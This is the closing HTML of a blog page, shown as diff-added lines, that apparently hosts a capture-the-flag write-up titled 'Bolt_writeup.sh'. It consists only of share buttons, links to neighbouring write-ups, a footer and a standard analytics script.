+<a class="resp-sharing-button__link" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2ftzero86-bits.netlify.app%2fposts%2fbolt_writeup%2f&amp;title=Bolt_writeup.sh&amp;summary=Bolt_writeup.sh&amp;source=https%3a%2f%2ftzero86-bits.netlify.app%2fposts%2fbolt_writeup%2f" target="_blank" rel="noopener" aria-label="" title="Share on linkedin">
+  <div class="resp-sharing-button resp-sharing-button--linkedin resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://reddit.com/submit/?url=https%3a%2f%2ftzero86-bits.netlify.app%2fposts%2fbolt_writeup%2f&amp;resubmit=true&amp;title=Bolt_writeup.sh" target="_blank" rel="noopener" aria-label="" title="Share on reddit">
+  <div class="resp-sharing-button resp-sharing-button--reddit resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0zm5.01 4.744c.688 0 1.25.561 1.25 1.249a1.25 1.25 0 0 1-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968 0 1.754.786 1.754 1.754 0 .716-.435 1.333-1.01 1.614a3.111 3.111 0 0 1 .042.52c0 2.694-3.13 4.87-7.004 4.87-3.874 0-7.004-2.176-7.004-4.87 0-.183.015-.366.043-.534A1.748 1.748 0 0 1 4.028 12c0-.968.786-1.754 1.754-1.754.463 0 .898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342 0 0 1 .14-.197.35.35 0 0 1 .238-.042l2.906.617a1.214 1.214 0 0 1 1.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687 0 1.248-.561 1.248-1.249 0-.688-.561-1.249-1.249-1.249zm5.5 0c-.687 0-1.248.561-1.248 1.25 0 .687.561 1.248 1.249 1.248.688 0 1.249-.561 1.249-1.249 0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327 0 0 0-.231.094.33.33 0 0 0 0 .463c.842.842 2.484.913 2.961.913.477 0 2.105-.056 2.961-.913a.361.361 0 0 0 .029-.463.33.33 0 0 0-.464 0c-.547.533-1.684.73-2.512.73-.828 0-1.979-.196-2.512-.73a.326.326 0 0 0-.232-.095z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.xing.com/app/user?op=share;url=https%3a%2f%2ftzero86-bits.netlify.app%2fposts%2fbolt_writeup%2f;title=Bolt_writeup.sh" target="_blank" rel="noopener" aria-label="" title="Share on xing">
+  <div class="resp-sharing-button resp-sharing-button--xing resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M18.188 0c-.517 0-.741.325-.927.66 0 0-7.455 13.224-7.702 13.657.015.024 4.919 9.023 4.919 9.023.17.308.436.66.967.66h3.454c.211 0 .375-.078.463-.22.089-.151.089-.346-.009-.536l-4.879-8.916c-.004-.006-.004-.016 0-.022L22.139.756c.095-.191.097-.387.006-.535C22.056.078 21.894 0 21.686 0h-3.498zM3.648 4.74c-.211 0-.385.074-.473.216-.09.149-.078.339.02.531l2.34 4.05c.004.01.004.016 0 .021L1.86 16.051c-.099.188-.093.381 0 .529.085.142.239.234.45.234h3.461c.518 0 .766-.348.945-.667l3.734-6.609-2.378-4.155c-.172-.315-.434-.659-.962-.659H3.648v.016z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="whatsapp://send?text=Bolt_writeup.sh%20https%3a%2f%2ftzero86-bits.netlify.app%2fposts%2fbolt_writeup%2f" target="_blank" rel="noopener" aria-label="" title="Share on whatsapp">
+  <div class="resp-sharing-button resp-sharing-button--whatsapp resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2ftzero86-bits.netlify.app%2fposts%2fbolt_writeup%2f&amp;t=Bolt_writeup.sh" target="_blank" rel="noopener" aria-label="" title="Share on hacker news">
+  <div class="resp-sharing-button resp-sharing-button--hackernews resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+			<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M0 24V0h24v24H0zM6.951 5.896l4.112 7.708v5.064h1.583v-4.972l4.148-7.799h-1.749l-2.457 4.875c-.372.745-.688 1.434-.688 1.434s-.297-.708-.651-1.434L8.831 5.896h-1.88z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://telegram.me/share/url?text=Bolt_writeup.sh&amp;url=https%3a%2f%2ftzero86-bits.netlify.app%2fposts%2fbolt_writeup%2f" target="_blank" rel="noopener" aria-label="" title="Share on telegram">
+  <div class="resp-sharing-button resp-sharing-button--telegram resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg>
+    </div>
+  </div>
+</a>
+
+      </div>
+
+    
+      <div class="pagination">
+        <div class="pagination__title">
+          <span class="pagination__title-h">Read other posts</span>
+          <hr />
+        </div>
+
+        <div class="pagination__buttons">
+          
+            <span class="button previous">
+              <a href="https://tzero86-bits.netlify.app/posts/dailybugle_writeup/">
+                <span class="button__icon">←</span>
+                <span class="button__text">DailyBugle_writeup.sh</span>
+              </a>
+            </span>
+          
+
+          
+            <span class="button next">
+              <a href="https://tzero86-bits.netlify.app/posts/hydra_writeup/">
+                <span class="button__text">Hydra_writeup.sh</span>
+                <span class="button__icon">→</span>
+              </a>
+            </span>
+          
+        </div>
+      </div>
+    
+
+
+    
+
+  </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2020</span>
+            
+            
+                <span><a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></span>
+            
+            <span> <a href="https://tzero86-bits.netlify.app/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
+        </div>
+    </div>
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>Powered by <a href="http://gohugo.io">Hugo</a></span>
+            <span>Made with &#10084; by <a href="https://github.com/rhazdon">Djordje Atlialp</a></span>
+        </div>
+    </div>
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+
+<script type="text/javascript" src="/bundle.min.dc716e9092c9820b77f96da294d0120aeeb189b5bcea9752309ebea27fd53bbe6b13cffb2aca8ecf32525647ceb7001f76091de4199ac5a3caa432c070247f5b.js" integrity="sha512-3HFukJLJggt3&#43;W2ilNASCu6xibW86pdSMJ6&#43;on/VO75rE8/7KsqOzzJSVkfOtwAfdgkd5BmaxaPKpDLAcCR/Ww=="></script>
+    
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-175520987-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+
+
+
+    </body>
+</html>
